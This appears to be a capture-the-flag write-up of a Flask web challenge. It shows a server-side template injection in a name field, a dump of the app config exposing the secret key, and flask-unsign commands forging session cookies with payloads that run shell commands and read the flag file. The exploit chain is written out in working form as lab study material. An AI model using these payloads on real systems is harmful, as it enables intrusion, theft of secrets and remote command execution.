In this challenge we are only able to enter a nickname. With the analysis

```html
<div class="home-container nes-container is-rounded">
    <h1 class="nes-text is-error">Welcome to the Flame Peaks</h1>
    <p class="nes-text">
      In a land of burning rivers and searing heat, the Fire Drake stands guard over the Emberstone. Many have sought its power; none have prevailed.
      <br><br>
      Legends speak of ancient template scrolls—arcane writings that twist fate when exploited. Hidden symbols may change everything.
      <br><br>
      Can you read the runes? Perhaps {{ 7 * 7 }} is the key.
    </p>
    
    <form action="/begin" method="POST" class="warrior-form nes-container is-rounded">
      <div class="form-group">
        <label for="warrior_name" class="nes-text is-error">What is your name, brave warrior?</label>
        <input type="text" id="warrior_name" name="warrior_name" class="nes-input" required placeholder="Enter your name..." maxlength="30" style="background-color: rgba(17, 24, 39, 0.95);">
      </div>
      <button type="submit" class="nes-btn is-error challenge-button">
        ⚔️ Challenge the Fire Drake
      </button>
    </form>
  </div>
```

We directly think about an SSTI. We thus test with a simple `{{7*7}}` and on the ending screen the SSTI is rendered and `49` is displayed.

We can then leak the Flask session with : 

```
{{config.items()}}
```

```plaintext
dict_items([('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', '521fdce3d745669f2b33ce8656c29c000b4861e7d228e6587e757162c21241bee48c620c99d53163af03553c61535cb01eb6d867885a1d961ab74577408f2ce80daae262b5'), ('SECRET_KEY_FALLBACKS', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('TRUSTED_HOSTS', None), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_PARTITIONED', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('MAX_FORM_MEMORY_SIZE', 500000), ('MAX_FORM_PARTS', 1000), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('PROVIDE_AUTOMATIC_OPTIONS', True)])
```

Flask cookie session signature key: `521fdce3d745669f2b33ce8656c29c000b4861e7d228e6587e757162c21241bee48c620c99d53163af03553c61535cb01eb6d867885a1d961ab74577408f2ce80daae262b5`

```
{{url_for.__globals__}}
```

```plaintext
{'__name__': 'flask.app', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f1e337924b0>, '__spec__': ModuleSpec(name='flask.app', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f1e337924b0>, origin='/app/venv/lib/python3.12/site-packages/flask/app.py'), '__file__': '/app/venv/lib/python3.12/site-packages/flask/app.py', '__cached__': '/app/venv/lib/python3.12/site-packages/flask/__pycache__/app.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen, Zope Corporation, the Python Software Foundation, and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'annotations': _Feature((3, 7, 0, 'beta', 1), None, 16777216), 'cabc': <module 'collections.abc' from '/usr/lib/python3.12/collections/abc.py'>, 'os': <module 'os' (frozen)>, 'sys': <module 'sys' (built-in)>, 't': <module 'typing' from '/usr/lib/python3.12/typing.py'>, 'weakref': <module 'weakref' from '/usr/lib/python3.12/weakref.py'>, 'timedelta': <class 'datetime.timedelta'>, 'iscoroutinefunction': <function iscoroutinefunction at 0x7f1e33d58040>, 'chain': <class 'itertools.chain'>, 'TracebackType': <class 'traceback'>, '_url_quote': <function quote at 0x7f1e347d4540>, 'click': <module 'click' from '/app/venv/lib/python3.12/site-packages/click/__init__.py'>, 'Headers': <class 'werkzeug.datastructures.headers.Headers'>, 'ImmutableDict': <class 'werkzeug.datastructures.structures.ImmutableDict'>, 'BadRequestKeyError': <class 'werkzeug.exceptions.BadRequestKeyError'>, 'HTTPException': <class 'werkzeug.exceptions.HTTPException'>, 'InternalServerError': <class 'werkzeug.exceptions.InternalServerError'>, 'BuildError': <class 'werkzeug.routing.exceptions.BuildError'>, 'MapAdapter': <class 'werkzeug.routing.map.MapAdapter'>, 'RequestRedirect': <class 'werkzeug.routing.exceptions.RequestRedirect'>, 'RoutingException': <class 'werkzeug.routing.exceptions.RoutingException'>, 'Rule': <class 'werkzeug.routing.rules.Rule'>, 'is_running_from_reloader': <function is_running_from_reloader at 0x7f1e33ac7060>, 'BaseResponse': <class 'werkzeug.wrappers.response.Response'>, 'get_host': <function get_host at 0x7f1e33b1e840>, 'cli': <module 'flask.cli' from '/app/venv/lib/python3.12/site-packages/flask/cli.py'>, 'ft': <module 'flask.typing' from '/app/venv/lib/python3.12/site-packages/flask/typing.py'>, 'AppContext': <class 'flask.ctx.AppContext'>, 'RequestContext': <class 'flask.ctx.RequestContext'>, '_cv_app': <ContextVar name='flask.app_ctx' at 0x7f1e3437c4f0>, '_cv_request': <ContextVar name='flask.request_ctx' at 0x7f1e3437c540>, 'current_app': <HTB 'application.app'>, 'g': <flask.g of 'application.app'>, 'request': <Request 'http://94.237.54.176:42357/battle-report' [POST]>, 'request_ctx': <RequestContext 'http://94.237.54.176:42357/battle-report' [POST] of application.app>, 'session': <SecureCookieSession {'warrior_name': '{{ url_for.__globals__ }}'}>, 'get_debug_flag': <function get_debug_flag at 0x7f1e33638c20>, 'get_flashed_messages': <function get_flashed_messages at 0x7f1e336e7b00>, 'get_load_dotenv': <function get_load_dotenv at 0x7f1e336b9d00>, 'send_from_directory': <function send_from_directory at 0x7f1e336e7ce0>, 'App': <class 'flask.sansio.app.App'>, '_sentinel': <object object at 0x7f1e347ecf00>, 'SecureCookieSessionInterface': <class 'flask.sessions.SecureCookieSessionInterface'>, 'SessionInterface': <class 'flask.sessions.SessionInterface'>, 'appcontext_tearing_down': <blinker.base.NamedSignal object at 0x7f1e336ed2e0; 'appcontext-tearing-down'>, 'got_request_exception': <blinker.base.NamedSignal object at 0x7f1e336ed220; 'got-request-exception'>, 'request_finished': <blinker.base.NamedSignal object at 0x7f1e336ec7a0; 'request-finished'>, 'request_started': <blinker.base.NamedSignal object at 0x7f1e336ec6e0; 'request-started'>, 'request_tearing_down': <blinker.base.NamedSignal object at 0x7f1e336ec710; 'request-tearing-down'>, 'Environment': <class 'flask.templating.Environment'>, 'Request': <class 'flask.wrappers.Request'>, 'Response': <class 'flask.wrappers.Response'>, 'T_shell_context_processor': ~T_shell_context_processor, 'T_teardown': ~T_teardown, 'T_template_filter': ~T_template_filter, 'T_template_global': ~T_template_global, 'T_template_test': ~T_template_test, '_make_timedelta': <function _make_timedelta at 0x7f1e336e6020>, 'Flask': <class 'flask.app.Flask'>}
```

The issue is that the user input is limited in terms of characters. So now that we have the key to sign the session cookies we can recreate them and then modify them right into the browser.

We then use flask-unsign to generate the cookies : 

```bash

# to check if it works
flask-unsign --sign --cookie "{'warrior_name': '{{config.items()}}'}" --secret '521fdce3d745669f2b33ce8656c29c000b4861e7d228e6587e
757162c21241bee48c620c99d53163af03553c61535cb01eb6d867885a1d961ab74577408f2ce80daae262b5'
eyJ3YXJyaW9yX25hbWUiOiJ7e2NvbmZpZy5pdGVtcygpfX0ifQ.Z93Pbg.baYnp4Gj3tcDP_7EoE9dUsDCiCc

# to check if command execution works
flask-unsign --sign --cookie "{'warrior_name': '{{url_for.__globals__.os.popen(\'id\').read()}}'}" --secret '521fdce3d745669f2b33ce8656c29c000b4861e7d228e6587e757162c21241bee48c620c99d53163af03553c61535cb01eb6d867885a1d961ab74577408f2ce80daae262b5'
eyJ3YXJyaW9yX25hbWUiOiJ7e3VybF9mb3IuX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0ifQ.Z93ejA.NH5hHHh3eD5QJ8ufqMKv7ZAaJAY

# list application directory searching for flag 
flask-unsign --sign --cookie "{'warrior_name': '{{url_for.__globals__.os.popen(\'ls /app -la\').read()}}'}" --secret '521fdce3d745669f2b33ce8656c29c000b4861e7d228e6587e757162c21241bee48c620c99d53163af03553c61535cb01eb6d867885a1d961ab74577408f2ce80daae262b5'
eyJ3YXJyaW9yX25hbWUiOiJ7e3VybF9mb3IuX19nbG9iYWxzX18ub3MucG9wZW4oJ2xzIC9hcHAgLWxhJykucmVhZCgpfX0ifQ.Z93gDQ.Gw2xyB6oI-1d98Uj5NPWmvjuTSs

# looting
flask-unsign --sign --cookie "{'warrior_name': '{{url_for.__globals__.os.popen(\'cat /app/flag.txt\').read()}}'}" --secret '521fdc
e3d745669f2b33ce8656c29c000b4861e7d228e6587e757162c21241bee48c620c99d53163af03553c61535cb01eb6d867885a1d961ab74577408f2ce80daae262b5'
eyJ3YXJyaW9yX25hbWUiOiJ7e3VybF9mb3IuX19nbG9iYWxzX18ub3MucG9wZW4oJ2NhdCAvYXBwL2ZsYWcudHh0JykucmVhZCgpfX0ifQ.Z93gRg.HT8pBr64L5laFmp8aMuaIcA2HyA

```